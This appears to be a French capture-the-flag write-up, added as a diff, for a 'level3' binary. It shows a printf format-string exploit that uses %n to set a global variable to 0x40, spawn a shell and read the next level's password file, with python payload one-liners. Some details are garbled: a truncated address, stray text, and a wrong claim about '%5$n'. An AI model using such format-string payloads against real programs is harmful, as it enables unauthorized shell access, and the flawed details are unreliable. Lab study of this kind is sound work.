@@ -1,0 +1,44 @@
+Nous avons un binaire qui lance un shell si la global m est egale a 0x40
+
+Pour modifier la global, nous allons utiliser printf.
+
+Si on lance le programme et on ecris "%x", nous avons une valeur hexa
+il s'agit du dessus de la stack.
+
+Nous devons chercher ou est notre global.
+
+D'abord on utilise "objdump -t ./level3"
+
+Nous avons cette ligne : 0804988c g		O	.bss00000004	m
+
+il s'agit de notre global m qui est aaaaaaaaaaa ladresse 0x0804988
+
+Si on fait : 
+python -c 'print("AAAA" + "\x8c\x98\x04\x08" + "BBBB" + "%x " * 10)' | ./level3
+
+On voit que notre globale est la 5eme dans la stack.
+
+On doit utiliser %n qui ecris dans une adresse le nombre de caractere afficher
+avant lui.
+
+Ici, nous devons donc ecrire 0x40 caractere puis faire le %n sur notre global
+
+Ce qui donne :
+
+python -c 'print("AAAA" + "\x8c\x98\x04\x08" + "BBBB" + " ddddddddddddddddddddddddddddddddddddddddaadaaaaaadd"+ "%5$n ")'
+
+Nota :
+
+"%5$n" == "%n%n%n%n%n"
+
+Nous ecrivons donc 0x40 caracteres et nous stocker la len dans la 5 adresse de la stack qui correspond a la global.
+
+Pour finir on enregistre notre payload dans un fichier :
+
+python -c 'print("AAAA" + "\x8c\x98\x04\x08" + "BBBB" + " ddddddddddddddddddddddddddddddddddddddddaadaaaaaadd"+ "%5$n ")' > /tmp/payload
+
+et on execute : 
+
+(cat /tmp/payload ; cat) | ./level3
+
+cat /home/user/level4/.pass
